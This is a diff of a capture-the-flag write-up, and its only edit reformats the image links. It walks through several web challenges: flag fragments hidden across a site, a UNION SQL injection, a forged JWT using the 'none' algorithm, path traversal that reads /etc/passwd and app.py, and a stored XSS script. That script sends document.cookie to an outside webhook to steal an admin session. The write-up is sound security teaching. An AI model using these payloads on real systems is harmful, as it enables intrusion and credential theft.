@@ -17,7 +17,7 @@ After accessing the web page, Initial observation reveals a main page with an em
 
 By analyzing the HTTP requests made by the browser, we can gain insight into the application’s structure, which includes the following elements:
 
-![[Pasted image 20260121060355.png]]
+![Pasted image 20260121060355.png](../_img/Pasted%20image%2020260121060355.png)
 
 - **HTML** document (`index.html`)
 - **CSS** stylesheet named `style.css`
@@ -28,44 +28,44 @@ To recover all fragments, we must systematically inspect the site using **Browse
 
 - ###### 1st Fragment
 	Found inside a `<div>` with the class `flag_box` on the main page.
-	![[Pasted image 20260121055727.png|450]]
+	![Pasted image 20260121055727.png](../_img/Pasted%20image%2020260121055727.png)
 	>Fragment: `fsuCTF{4nd_`
 
 - ###### 2nd Fragment
 	Located by inspecting the source code; an HTML comment was hidden at the very bottom of the document.
-	![[Pasted image 20260121055922.png]]
+	![Pasted image 20260121055922.png](../_img/Pasted%20image%2020260121055922.png)
 	>Fragment: `In_7h3_F4c3`
 
 - ###### 3rd Fragment
 	Found in `style.css` under the `.flag_box strong` definition as a comment.
-	![[Pasted image 20260121060033.png]]
+	![Pasted image 20260121060033.png](../_img/Pasted%20image%2020260121060033.png)
 	>Fragment: `_0f_7h47_V4`
 
 - ###### 4th Fragment
 	Revealed in the HTTP response headers when requesting the main page.
-	![[Pasted image 20260121060738.png]]
+	![Pasted image 20260121060738.png](../_img/Pasted%20image%2020260121060738.png)
 	>Fragment: `57_7r345ur`
 
 - ###### 5th Fragment
 	Discovered by navigating to `/robots.txt`, which also hinted at a hidden directory `/laughtale`
-	![[Pasted image 20260121061639.png]]
+	![Pasted image 20260121061639.png](../_img/Pasted%20image%2020260121061639.png)
 	>Fragment: `3_Which_W4`
 
 - ###### 6th Fragment
 	Found in `/static/zoro.js` using the Debugger tab.
-	![[Pasted image 20260121061120.png]]
+	![Pasted image 20260121061120.png](../_img/Pasted%20image%2020260121061120.png)
 	>Fragment: `5_V3ry_R34`
 
 - ###### 7th Fragment
 	Located in the browser's storage/cookie section under the name `Flag Part 7`.
-	![[Pasted image 20260121061416.png]]
+	![Pasted image 20260121061416.png](../_img/Pasted%20image%2020260121061416.png)
 	>Fragment: `1_Ind33d_H`
 
 - ###### 8th Fragment
-	We navigated to the `/laughtale` route , which was discovered earlier in the `robots.txt` file alongside the 5th fragment. ![[Pasted image 20260121061708.png]]
+	We navigated to the `/laughtale` route , which was discovered earlier in the `robots.txt` file alongside the 5th fragment. ![Pasted image 20260121061708.png](../_img/Pasted%20image%2020260121061708.png)
 	Attempting to access this page initially resulted in a `403 FORBIDDEN` status and a message stating that "Only the King of the Pirates made it to Laughtale!". 
-	![[Pasted image 20260121062053.png]]
-	Based on this hint, a quick internet search for "King of Pirates One Piece" identified the legendary figure as "Gol D. Roger". By using Caido to modify the request and change the `Pirate` cookie from `"Monkey D. Luffy"` to `"Gol D. Roger"` , the server granted access with a `200 OK` response , revealing the final fragment. ![[Pasted image 20260121062408.png]]	![[Pasted image 20260121062510.png]]	![[Pasted image 20260121062628.png]]
+	![Pasted image 20260121062053.png](../_img/Pasted%20image%2020260121062053.png)
+	Based on this hint, a quick internet search for "King of Pirates One Piece" identified the legendary figure as "Gol D. Roger". By using Caido to modify the request and change the `Pirate` cookie from `"Monkey D. Luffy"` to `"Gol D. Roger"` , the server granted access with a `200 OK` response , revealing the final fragment. ![Pasted image 20260121062408.png](../_img/Pasted%20image%2020260121062408.png)	![Pasted image 20260121062510.png](../_img/Pasted%20image%2020260121062510.png)	![Pasted image 20260121062628.png](../_img/Pasted%20image%2020260121062628.png)
 	>Fragment: `3_14ugh3d}`
 
 #### 3. Flag
@@ -82,10 +82,10 @@ This challenge involves a web-based log search interface called "NERV RECORD SEA
 The initial investigation of the web application revealed several key components:
 - **Hidden SQL Structure** 
 	Examination of the `index.html` source code reveals a developer comment showing the internal SQL query: 
-	![[Pasted image 20260122212456.png]]
+	![Pasted image 20260122212456.png](../_img/Pasted%20image%2020260122212456.png)
 - **Encoded Communication**
 	Traffic analysis of a legitimate request via Caido's Proxy showed that the server receives data via **POST** requests. The request payload is entirely **Base64 encoded**. 
-	![[Pasted image 20260122213220.png]]![[Pasted image 20260122213309.png]]
+	![Pasted image 20260122213220.png](../_img/Pasted%20image%2020260122213220.png)![Pasted image 20260122213309.png](../_img/Pasted%20image%2020260122213309.png)
 	A standard request to the table "*geofront_security_logs*" with the search term "*S-886*" decodes to `table_select=geofront_security_logs&search_term=S-886` revealing the parameters `table_select` and `search_term`.
 	
 - **Legitimate Tables**
@@ -126,7 +126,7 @@ WHERE
 
 This revealed a hidden table not listed in the UI: **`instrumentality_SECRETS`**. The schema showed it contained two columns: `item` and `value`.
 
-![[Pasted image 20260122221903.png]]
+![Pasted image 20260122221903.png](../_img/Pasted%20image%2020260122221903.png)
 
 >[!info] Note on UNION SELECT:
 >For a `UNION` operation to be successful, the injected query must return the exact same number of columns as the original query. In this case, the table utilizes **5 columns**, which is why placeholders (like `1, 4, 5`) are used to align the results.
@@ -152,7 +152,7 @@ WHERE
 ```
 
 The resulting output displayed several NERV secrets. The "MAGI Master Key" entry contained the flag.
-![[Pasted image 20260122225200.png]]
+![Pasted image 20260122225200.png](../_img/Pasted%20image%2020260122225200.png)
 
 Flag: `fsuCTF{g37_in_7h3_c7f_m4chine_5hinji}`
 
@@ -164,17 +164,17 @@ This challenge shows an application consisting on a training panel that manages 
 #### 1. Analysis
 The challenge begins on the home page, which features a link to a "training" panel. Upon clicking the link to access `/training`, the server returns a **403 Forbidden** status with the message **"Admins only"**.
 
-![[Pasted image 20260127063241.png|350]]
+![Pasted image 20260127063241.png](../_img/Pasted%20image%2020260127063241.png)
 
 To investigate the session management, we inspected the browser's storage and identified a cookie named `token`. The value of this cookie follows the standard three-part structure (Header.Payload.Signature) of a **JSON Web Token (JWT)**. 
 
-![[Pasted image 20260127063330.png]]
+![Pasted image 20260127063330.png](../_img/Pasted%20image%2020260127063330.png)
 
 Using an online tool to decode the JWT, we inspect the initial token, finding the following information:
 - **Header**: Specifies the algorithm used for the signature (`HS256`) and the token type (`JWT`).
 - **Payload**: Contains the claims, specifically identifying the user with the `"role": "guest"`.
 
-![[Pasted image 20260122231544.png]]
+![Pasted image 20260122231544.png](../_img/Pasted%20image%2020260122231544.png)
 
 *Link to the tool: https://fusionauth.io/dev-tools/jwt-decoder* 
 
@@ -197,19 +197,19 @@ First, the JWT was modified to change the role and algorithm:
 - **Modified Payload**: `{"role": "admin"}`.
 - **Resulting Token**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.`.
 
-![[Pasted image 20260122231503.png]]
+![Pasted image 20260122231503.png](../_img/Pasted%20image%2020260122231503.png)
 
 After updating the cookie, access to the training panel was granted. 
 
 To confirm the Path Traversal vulnerability, a request was made to read the system's password file: `GET /img?f=../../../../etc/passwd`.
 
-![[Pasted image 20260123002306.png]]
+![Pasted image 20260123002306.png](../_img/Pasted%20image%2020260123002306.png)
 
 The server successfully returned the contents of `/etc/passwd`. Furthermore, the HTTP response headers provide critical information about the environment. The `Server` header identifies the backend as **Werkzeug/3.1.5 Python/3.11.14**. This confirms we are dealing with a Python-based application, likely using the Flask framework.
 
 To find the flag, we attempted to read the application's source code, commonly named `app.py` in Flask environments. We issued the following request: `GET /img?f=../app.py HTTP/1.1`.
 
-![[Pasted image 20260127063421.png]]
+![Pasted image 20260127063421.png](../_img/Pasted%20image%2020260127063421.png)
 
 The server returned the full source code . Upon inspection, the flag was found hardcoded as the application's `SECRET_KEY`.
 
@@ -245,13 +245,13 @@ After confirming the vulnerability, we design a script to steal the administrato
 1. **Injection:** We submit the following payload into the "content" textarea:
     
     `<script>fetch('https://webhook.site/860618c4-e7a6-40f5-bb32-e564cd824fd3?cookie=' + document.cookie);</script>`.
-	![[Pasted image 20260123010928.png|600]]
+	![Pasted image 20260123010928.png](../_img/Pasted%20image%2020260123010928.png)
 	*We can observe that the review box appears empty, which indicates that the payload has been interpreted as executable code rather than being rendered as plain text.*
     
 2. **Trigger:** After submitting the review, we click the **"Report to Admin"** button to force the administrator bot to view our post.
     
 3. **Capture:** We monitor our Webhook.site dashboard for incoming requests. Within seconds, a GET request appears with a query string.
-    ![[Pasted image 20260128071902.png]]
+    ![Pasted image 20260128071902.png](../_img/Pasted%20image%2020260128071902.png)
 	This string reveals the administrator's session token: `auth=icantbelieveitsnotasecuretoken`.
     
 4. **Flag Retrieval:** We manually set our browser's cookie to this value and refresh the `/admin` page. This grants us administrative access and reveals the flag.
